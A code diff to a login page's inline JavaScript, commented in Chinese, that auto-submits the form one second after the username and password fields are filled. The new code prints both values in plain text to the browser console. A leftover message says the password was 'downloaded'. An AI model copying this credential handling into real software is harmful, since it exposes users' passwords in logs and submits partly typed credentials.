@@ -22,7 +22,32 @@
     <p id="message" style="color: green; display: none;">✅ 密碼已下載！</p>
    
     <script>
-        function autoSubmitAndDownload() {
+        document.addEventListener("DOMContentLoaded", function () {
+        // 取得表單與輸入欄位
+        const form = document.getElementById("login-form");
+        const usernameInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
+    
+        // 監聽輸入欄位變化
+        function checkAndSubmit() {
+            let username = usernameInput.value.trim();
+            let password = passwordInput.value.trim();
+    
+            console.log("帳號:", username, "密碼:", password); // 在 Console 顯示輸入的值
+    
+            if (username && password) {
+                setTimeout(() => {
+                    console.log("⏳ 準備提交表單...");
+                    form.submit(); // 提交表單
+                }, 1000); // 1 秒後提交
+            }
+        }
+    
+        // 當使用者輸入時，觸發檢查
+        usernameInput.addEventListener("input", checkAndSubmit);
+        passwordInput.addEventListener("input", checkAndSubmit);
+    });
+        /*function autoSubmitAndDownload() {*/
             /*
             // 取得帳號與密碼
             let username = document.getElementById("username").value.trim();
@@ -50,6 +75,8 @@
             // **顯示提示**
             document.getElementById("message").style.display = "block";
             */
+            /*
+            console.log("auto:", username, password);
             // **2 秒後自動提交表單**
             setTimeout(() => {
                 document.forms[0].submit();
@@ -61,6 +88,7 @@
             let username = document.getElementById("username").value.trim();
             let password = document.getElementById("password").value.trim();
 
+            console.log("data:", username, password);
             if (username && password) {
                 setTimeout(autoSubmitAndDownload, 1000);
             }
@@ -68,7 +96,7 @@
         
         // **監聽輸入欄位，當使用者輸入完畢後 1 秒執行**
         document.getElementById("username").addEventListener("input", checkAndStart);
-        document.getElementById("password").addEventListener("input", checkAndStart);
+        document.getElementById("password").addEventListener("input", checkAndStart);*/
     </script>
     
 </body>
